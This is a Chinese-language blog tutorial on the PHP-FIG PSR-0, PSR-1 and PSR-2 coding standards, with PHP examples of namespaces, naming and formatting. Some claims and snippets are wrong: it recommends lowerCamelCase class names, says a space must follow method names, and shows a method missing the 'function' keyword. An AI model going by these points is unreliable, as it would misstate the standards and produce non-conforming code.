<h2 id="PHP-FIG"><a href="#PHP-FIG" class="headerlink" title="PHP-FIG"></a>PHP-FIG</h2><p>在说啥是<code>PSR-[0-4]</code>规范的之前，我觉得我们有必要说下它的发明者和规范者：<code>PHP-FIG</code>，它的网站是：<span class="exturl" data-url="aHR0cDovL3d3dy5waHAtZmlnLm9yZ+OAguWwseaYr+i/meS4quiBlOebn+e7hOe7h+WPkeaYjuWSjOWIm+mAoOS6hlBTUi1bMC00XeinhOiMg++8jOiGnOaLnOWQp++8jOWxjOS4neS7rO+8gQ==" title="http://www.php-fig.org。就是这个联盟组织发明和创造了PSR-[0-4]规范，膜拜吧，屌丝们！">www.php-fig.org。就是这个联盟组织发明和创造了PSR-[0-4]规范，膜拜吧，屌丝们！<i class="fa fa-external-link"></i></span></p>
<p>FIG 是 Framework Interoperability Group（框架可互用性小组）的缩写，由几位开源框架的开发者成立于 2009 年，从那开始也选取了很多其他成员进来，虽然不是 “官方” 组织，但也代表了社区中不小的一块。组织的目的在于：以最低程度的限制，来统一各个项目的编码规范，避免各家自行发展的风格阻碍了程序设计师开发的困扰，于是大伙发明和总结了<code>PSR</code>，<code>PSR</code>是Proposing a Standards Recommendation（提出标准建议）的缩写，截止到目前为止，总共有5套PSR规范，分别是：</p>
<blockquote>
<p>PSR-0 (Autoloading Standard) 自动加载标准<br>PSR-1 (Basic Coding Standard) 基础编码标准<br>PSR-2 (Coding Style Guide) 编码风格向导<br>PSR-3 (Logger Interface) 日志接口<br>PSR-4 (Improved Autoloading) 自动加载的增强版，可以替换掉PSR-0了。</p>
</blockquote>
<hr>
<p>接下来的篇目，我们会针对这5套，深入了解下。仔细学习下受万千<code>PHPer</code>热捧的这5套规范到底有啥出众之处。</p>
<h2 id="0-0-PSR-0-规范"><a href="#0-0-PSR-0-规范" class="headerlink" title="0.0 PSR-0 规范"></a>0.0 PSR-0 规范</h2><p>PRS-0规范是他们出的第1套规范，主要是制定了一些自动加载标准（Autoloading Standard），如果你英文比较好，可以直接看官网的这个：PSR-0，很短。我们打开PSR-0的主页时，发现多了一个警告：</p>
<blockquote>
<p>Deprecated - As of 2014-10-21 PSR-0 has been marked as deprecated. PSR-4 is now recommended as an alternative.</p>
</blockquote>
<hr>
<p>大概意思：</p>
<blockquote>
<p>不推荐使用 - 在2014年10月21日PSR-0已被标记为过时。PSR-4现在推荐作为替代。</p>
</blockquote>
<hr>
<p>那么也就是说PSR-0已！经！过！时！了！，别哭，<code>PHP</code>代码狗。虽说已经过时，但是我们也可以看看嘛，这不影响我们的学习，好了。废话不说了，开始吧：<br>PSR-0强制性要求几点：</p>
<blockquote>
<ul>
<li>一个完全合格的namespace和class必须符合这样的结构：“\&lt; Vendor Name&gt;(&lt; Namespace&gt;)*&lt; Class Name&gt;”</li>
<li>每个namespace必须有一个顶层的namespace（”Vendor Name”提供者名字）</li>
<li>每个namespace可以有多个子namespace</li>
<li>当从文件系统中加载时，每个namespace的分隔符(/)要转换成 DIRECTORY_SEPARATOR(操作系统路径分隔符)</li>
<li>在类名中，每个下划线(_)符号要转换成DIRECTORY_SEPARATOR(操作系统路径分隔符)。在namespace中，下划线(_)符号是没有（特殊）意义的。</li>
<li>当从文件系统中载入时，合格的namespace和class一定是以 .php 结尾的</li>
<li>verdor name,namespaces,class名可以由大小写字母组合而成（大小写敏感的）</li>
</ul>
</blockquote>
<hr>
<p>是不是有点看不懂啊。什么namespace啊，什么autoloading啊。所以，如果你对命名空间还不是特别懂的话，可以google下namespace 和 自动加载相关的php知识。或者看下一篇，我专门来讲讲他们：namespace 和 autoloading<br>好，我们接着一条条举例来分析下：</p>
<h3 id="0-1-第1条"><a href="#0-1-第1条" class="headerlink" title="0.1 第1条"></a>0.1 第1条</h3><p>比如我的文件 /Doctrine/Common/IsolatedClassLoader.php 这样子的一个类文件，那么你的namespace命名就必须声明称这样：</p>
<blockquote>
<p>声明：namespace  \Doctrine\Common\<br>调用：\Doctrine\Common\IsolatedClassLoader</p>
</blockquote>
<hr>
<p>其中，Doctrine 表示一个模块目录 Vendor name, common就是namesapce, IsolatedClassLoader是class name。这样一看就知道这个文件的目录层次，一目了然。<br>再比如：/path/to/project/lib/vendor/Symfony/Core/Request.php 文件：</p>
<blockquote>
<p>声明：namespace \Symfony\Core<br>调用：\Symfony\Core\Request</p>
</blockquote>
<hr>
<h3 id="0-2-0-3-第2，3条"><a href="#0-2-0-3-第2，3条" class="headerlink" title="0.2-0.3 第2，3条"></a>0.2-0.3 第2，3条</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">namespace \Zend\Acl =&gt; /path/to/project/lib/vendor/Zend/Acl.php</span><br><span class="line">namespace \Zend\Mail\Message =&gt; /path/to/project/lib/vendor/Zend/Mail/Message.php</span><br></pre></td></tr></table></figure>
<p>必须有一个顶级的zend的namespace, zend 下面可以有message子命名空间。</p>
<h3 id="0-4-第4条"><a href="#0-4-第4条" class="headerlink" title="0.4 第4条"></a>0.4 第4条</h3><p>看这个例子，我们需要new 一个这样的类<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> \Symfony\Core\Request</span><br></pre></td></tr></table></figure></div></p>
<p>那么我再加载这个类文件时候，就要将分隔符 \ 转换成 目录，也就是去 Vendor -&gt; Symfony-&gt;Core-&gt;Request.php 一层层的目录找到这个文件。其实也就是和第1,2,3是反过来的对应关系。</p>
<h3 id="0-5-第5条"><a href="#0-5-第5条" class="headerlink" title="0.5 第5条"></a>0.5 第5条</h3><p>第5条是说<code>namespace</code>命名中的这个_ 符号 没有任何用处，就是用来表示目录分隔符的，但是注意在PRS-4中已经取消了这个_ ，那么我们还是看一下，这个过时的规定是怎么样的：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">\namespace\package\Class_Name =&gt; /path/to/project/lib/vendor/namespace/package/Class/Name.php</span><br><span class="line">\namespace\package_name\Class_Name =&gt; /path/to/project/lib/vendor/namespace/package_name/Class/Name.php</span><br></pre></td></tr></table></figure></p>
<p>以上2个namespace中的 _ 其实是目录分隔符。并不是class name就是那样的。现在PSR-4出来后，确实觉得这样的规定有点不好。怪怪的。</p>
<h3 id="0-6-第6条"><a href="#0-6-第6条" class="headerlink" title="0.6 第6条"></a>0.6 第6条</h3><p>第6条不用多说。既然你用<code>php</code>，文件名当然是得用<code>.php</code> 后缀结尾。这个规定的原因，我大致猜一下，估计是有人用 <code>.php3</code> 后缀的。好吧。这个是个神话了。因为在apache的配置文件中是允许的：<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;IfModule dir_module&gt;</span></span><br><span class="line">    <span class="attribute">DirectoryIndex</span> index.php index.php3 index.html index.htm</span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure></div></p>
<p>所以，老老实实的用.php作为后缀名吧。</p>
<h3 id="0-7-第7条"><a href="#0-7-第7条" class="headerlink" title="0.7 第7条"></a>0.7 第7条</h3><p>文件大小写的问题，这个其实是很重要的。因为Linux系统下是区分文件名和目录名大小写的，而在Windows下是不区分的。所以就会经常出现问题，比如：<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span>  \<span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">IsolatedClassLoader</span></span><br></pre></td></tr></table></figure></div></p>
<p>在Linux下就去严格按照大小写去找目录和文件了。但是如果你在Windows下开发，全是小写也不会报错，你一发布到Linux上就悲剧了，提示找不到文件。所以，大小写太重要了。</p>
<h2 id="1-0-PSR-1-规范"><a href="#1-0-PSR-1-规范" class="headerlink" title="1.0 PSR-1 规范"></a>1.0 PSR-1 规范</h2><p>还是那句话，如果你英文比较好，可以直接看官网的这个：PSR-1，也不长，基本能看懂。但是如果你英语不好，那么还是请继续往下看</p>
<blockquote>
<p>-<code>PHP</code>源文件必须只使用 &lt;?php 和 &lt;?= 这两种标签</p>
<ul>
<li>源文件中php代码的编码格式必须是不带字节顺序标记(BOM)的UTF-8。</li>
<li>一个源文件建议只用来做声明（类(class)，函数(function)，常量(constant)等）或者只用来做一些引起副作用的操作（例如：输出信息，修改.ini配置等），但不建议同时做这两件事。</li>
<li>命名空间(namespace)和类(class) 必须遵守PSR-0标准。</li>
<li>类名(class name) 必须使用骆驼式(StudlyCaps)写法 (注：驼峰式(cameCase)的一种变种，后文将直接用StudlyCaps表示)。</li>
<li>类(class)中的常量必须只由大写字母和下划线(_)组成。</li>
<li>方法名(method name) 必须使用驼峰式(cameCase)写法。</li>
</ul>
</blockquote>
<hr>
<p>好，就是上面的基本7大点，有些很简单，就不过多说明，第3点需要仔细说下。</p>
<h3 id="1-1-第1条"><a href="#1-1-第1条" class="headerlink" title="1.1 第1条"></a>1.1 第1条</h3><p>这个基本都是大家都懂得的，<code>PHP</code>代码必须只使用长标签<code>(&lt;?php ?&gt;)</code>或者短输出式标签<code>(&lt;?= ?&gt;)</code>；而不要使用其他标签。<br>之所以说这个，是因为我们在学习<code>PHP</code>的时候，一般的教材都告诉我们说，php有4种标记风格：<code>php</code>的4种标记风格 所以，很多人就乱来了。特别是<code>asp</code>风格的兼职是折磨好么！！！</p>
<h3 id="1-2-第2条"><a href="#1-2-第2条" class="headerlink" title="1.2 第2条"></a>1.2 第2条</h3><p>这个不多说，保存的时候格式必须是<code>无BOM的UTF-8</code>格式，否则会出现很多无法解释的千奇百怪的问题。千万别傻逼的用Windows下的text文本编辑器保存文件啊</p>
<h3 id="2-3-第3条"><a href="#2-3-第3条" class="headerlink" title="2.3 第3条"></a>2.3 第3条</h3><p>这个通俗的说呢。就是别把一些输出和修改的操作(副作用) 和 类文件混合在一起，专注一点，这个文件专门来声明<code>Class</code>, 那个文件专门来修改配置文件，别混在一起写：<br>所以，以下的这个文件是有问题的，最好不要这样：<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 副作用：修改了ini配置</span></span><br><span class="line">ini_set(<span class="string">'error_reporting'</span>, E_ALL);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 副作用：载入了文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"file.php"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 副作用：产生了输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;html&gt;\n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 声明 function</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>你看上面看起来多乱啊。最好全部分开来写:<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Lib</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__NAMESPACE__</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__NAMESPACE__</span> . <span class="string">' static function test &lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p><em>修改ini:</em><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">'error_reporting'</span>, E_ALL);</span><br></pre></td></tr></table></figure></div></p>
<p><em>require 文件：</em><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> DIR . <span class="string">'/loading.php'</span>;</span><br><span class="line">spl_autoload_register(<span class="string">"\\AutoLoading\\loading::autoload"</span>);</span><br></pre></td></tr></table></figure></div></p>
<p>你看是不是整齐好看多了。当然这个是很难约束的。自己仔细划分。</p>
<h3 id="1-4-第4条"><a href="#1-4-第4条" class="headerlink" title="1.4 第4条"></a>1.4 第4条</h3><p>第4条是约束namespace的，前面已经说过，不多说。值得说的是名字要是驼峰方式来</p>
<h3 id="1-5-第5条"><a href="#1-5-第5条" class="headerlink" title="1.5 第5条"></a>1.5 第5条</h3><p>class name必须要用驼峰方式写，驼峰又分小驼峰和大驼峰（小驼峰是第一个字母是小写）这样写看着舒服也比较规范，不做要求，反正是驼峰就可以了。我喜欢用小驼峰：<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getUserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<h3 id="1-6-第6条"><a href="#1-6-第6条" class="headerlink" title="1.6 第6条"></a>1.6 第6条</h3><p>是规定类中的常量名(const)声明必须要全部大写，如果有多个单词，就用_分开：<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getUserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 全部大写</span></span><br><span class="line">    <span class="keyword">const</span> NAME = <span class="string">'phper'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用_隔开</span></span><br><span class="line">    <span class="keyword">const</span> HOUSE_INFO = <span class="string">'已经深圳买房'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<h3 id="第7条"><a href="#第7条" class="headerlink" title="第7条"></a>第7条</h3><p>method name必须要用驼峰方式写，大小驼峰都可以，不做要求，我喜欢用小驼峰：<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getUserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<h2 id="PRSR-2-规范"><a href="#PRSR-2-规范" class="headerlink" title="PRSR-2 规范"></a><em>PRSR-2 规范</em></h2><p><code>PSR-2</code> 规范的官网链接在此：<code>PSR-2</code> 这一规范主要是约束代码风格的，可是说是所有里面最关键最重要的，也是需要好好规范和共同遵守的。<br>我们一个个来看下，只能我大略的写一些比较重要的，或者说平时用的最多的。</p>
<h3 id="2-1-源文件"><a href="#2-1-源文件" class="headerlink" title="2.1 源文件"></a>2.1 源文件</h3><blockquote>
<ul>
<li>文件末尾必须空一行。</li>
<li>必须使用Unix LF(换行)作为行结束符。</li>
<li>纯PHP代码源文件的关闭标签?&gt;必须省略。</li>
</ul>
</blockquote>
<hr>
<p>第3点其实是蛮重要的，我之前还老写闭合，现在不写了。这可以避免在 <code>PHP</code> 结束标记之后万一意外加入了空格或者换行符，会导致 PHP 开始输出这些空白，而脚本中此时并无输出的意图。</p>
<h3 id="2-2-缩进"><a href="#2-2-缩进" class="headerlink" title="2.2 缩进"></a>2.2 缩进</h3><p>必须使用4个空格来缩进，不能使用<code>Tab</code>键。当然你如果把Tab在编辑器里手动设置为4个空格也可以。这样的目的是因为：每个人的机器上的Tab键都不一样，有些是4个空格，有些是8个空格，在你的机器上看着很爽的代码，在别人机器上了就各种恶心了。所以，统一搞成4个空格，不管在哪里打开都是美观的。</p>
<h3 id="2-3-行"><a href="#2-3-行" class="headerlink" title="2.3 行"></a>2.3 行</h3><p>一行推荐的是最多写80个字符，多于这个字符就应该换行了，一般的编辑器是可以设置的。</p>
<h3 id="2-4-关键字和-True-False-Null"><a href="#2-4-关键字和-True-False-Null" class="headerlink" title="2.4 关键字和 True/False/Null"></a>2.4 关键字和 True/False/Null</h3><p><code>php</code>的关键字，必须小写，<code>boolean</code>值：<code>true</code>，<code>false</code>，<code>null</code>也必须小写<br>下面是<code>php</code>的<code>keyword</code>，必须小写。</p>
<blockquote>
<p>‘__halt_compiler’, ‘abstract’, ‘and’, ‘array’, ‘as’, ‘break’, ‘callable’, ‘case’, ‘catch’, ‘class’, ‘clone’, ‘const’, ‘continue’, ‘declare’, ‘default’, ‘die’, ‘do’, ‘echo’, ‘else’, ‘elseif’, ‘empty’, ‘enddeclare’, ‘endfor’, ‘endforeach’, ‘endif’, ‘endswitch’, ‘endwhile’, ‘eval’, ‘exit’, ‘extends’, ‘final’, ‘for’, ‘foreach’, ‘function’, ‘global’, ‘goto’, ‘if’, ‘implements’, ‘include’, ‘include_once’, ‘instanceof’, ‘insteadof’, ‘interface’, ‘isset’, ‘list’, ‘namespace’, ‘new’, ‘or’, ‘print’, ‘private’, ‘protected’, ‘public’, ‘require’, ‘require_once’, ‘return’, ‘static’, ‘switch’, ‘throw’, ‘trait’, ‘try’, ‘unset’, ‘use’, ‘var’, ‘while’, ‘xor’</p>
</blockquote>
<hr>
<h3 id="2-5-命名空间-Namespace-和导入-Use-声明"><a href="#2-5-命名空间-Namespace-和导入-Use-声明" class="headerlink" title="2.5 命名空间(Namespace)和导入(Use)声明"></a>2.5 命名空间(Namespace)和导入(Use)声明</h3><p>先简单文字描述下：</p>
<ul>
<li>命名空间(<code>namespace</code>)的声明后面必须有一行空行。</li>
<li>所有的导入(<code>use</code>)声明必须放在命名空间(<code>namespace</code>)声明的下面。</li>
<li>一句声明中，必须只有一个导入(<code>use</code>)关键字。</li>
<li>在导入(<code>use</code>)声明代码块后面必须有一行空行。<br><em>用代码来说明下：</em>  </li>
</ul>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Lib</span>\<span class="title">Databases</span>; <span class="comment">// 下面必须空格一行</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><em><code>namespace</code>下空一行，才能使用<code>use</code>，再空一行，才能声明<code>class</code></em></p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Lib</span>\<span class="title">Databases</span>; <span class="comment">// 下面必须空格一行</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">FooInterface</span>; <span class="comment">// use 必须在namespace 后面声明</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">BarClass</span> <span class="title">as</span> <span class="title">Bar</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">OtherVendor</span>\<span class="title">OtherPackage</span>\<span class="title">BazClass</span>; <span class="comment">// 下面必须空格一行</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="2-6-类-class-，属性-property-和方法-method"><a href="#2-6-类-class-，属性-property-和方法-method" class="headerlink" title="2.6 类(class)，属性(property)和方法(method)"></a>2.6 类(<code>class</code>)，属性(<code>property</code>)和方法(<code>method</code>)</h3><p>（1）、继承(<code>extends</code>) 和实现(<code>implement</code>) 必须和 <code>class</code> <code>name</code> 写在一行，切花括号要换行写。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Lib</span>\<span class="title">Databaes</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> <span class="keyword">implements</span> \<span class="title">PDO</span>, \<span class="title">DB</span> // 写一行</span></span><br><span class="line"><span class="class"></span>&#123; <span class="comment">// 换行写&#123;</span></span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>（2）、属性(<code>property</code>)必须声明其可见性，到底是 <code>public</code> 还是 <code>protected</code> 还是 <code>private</code>，不能省略，也不能使用<code>var</code>, <code>var</code>是<code>php</code>老版本中的什么方式，等用于<code>public</code>。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Lib</span>\<span class="title">Databaes</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> <span class="keyword">implements</span> \<span class="title">PDO</span>, \<span class="title">DB</span> // 写一行</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $foo = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">'yangyi'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">'17'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>（3）、方法(method)，必须声明其可见性，到底是public还是protected还是private，不能省略。并且，花括号{必须换行写。如果有多个参数，第一个参数后紧接,,再加个空格，且函数name和(之间必须要有个空格：<code>function_name($par,$par2,$pa3)</code>,如果参数有默认值，也要用左右空格分开。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Lib</span>\<span class="title">Databaes</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> <span class="keyword">implements</span> \<span class="title">PDO</span>, \<span class="title">DB</span> // 写一行</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> getInfo ($name, $age, $gender = <span class="number">1</span>) <span class="comment">// 函数名getInfo和(之间有个空格，参数之间也要有空格。默认参数也要左右都有空格</span></span><br><span class="line">    &#123; <span class="comment">// 必须换行写 &#123;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>（4）、当用到抽象(<code>abstract</code>)和终结(<code>final</code>)来做类声明时，它们必须放在可见性声明 （<code>public</code> 还是<code>protected</code>还是<code>private</code>）的前面。而当用到静态(<code>static</code>)来做类声明时，则必须放在可见性声明的后面。<br><em>直接上代码：</em><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Vendor</span>\<span class="title">Package</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> $foo; <span class="comment">// static放后面</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">zim</span><span class="params">()</span></span>; <span class="comment">// abstract放前面</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span> // <span class="title">final</span>放前面，<span class="title">static</span>放最后。</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 方法主体部分</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<h3 id="2-7-控制结构"><a href="#2-7-控制结构" class="headerlink" title="2.7 控制结构"></a>2.7 控制结构</h3><p><em>控制接口，就是 <code>if else while switch</code>等。这一类的写法规范也是经常容易出现问题的，也要规范一下</em><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($expr1) &#123; <span class="comment">// 左右空格</span></span><br><span class="line">    <span class="comment">// if body</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> ($expr2) &#123; <span class="comment">// elesif 连着写</span></span><br><span class="line">    <span class="comment">// elseif body</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// else body;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p><em>（2）、switch，case 注意左右空格和换行，还是直接上规范代码</em><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span> ($expr) &#123; <span class="comment">// 左右空格</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'First case, with a break'</span>; <span class="comment">// 对齐</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 换行写break，也对齐。</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Second case, which falls through'</span>;</span><br><span class="line">        <span class="comment">// no break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Third case, return instead of break'</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Default case'</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p><em>（3）、<code>while</code>，<code>do</code> <code>while</code> 的写法也是类似，要左右空格，上代码：</em><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> ($expr) &#123; <span class="comment">// 左右空格</span></span><br><span class="line">    <span class="comment">// structure body</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// structure body; // 左右空格</span></span><br><span class="line">&#125; <span class="keyword">while</span> ($expr);</span><br></pre></td></tr></table></figure></div></p>
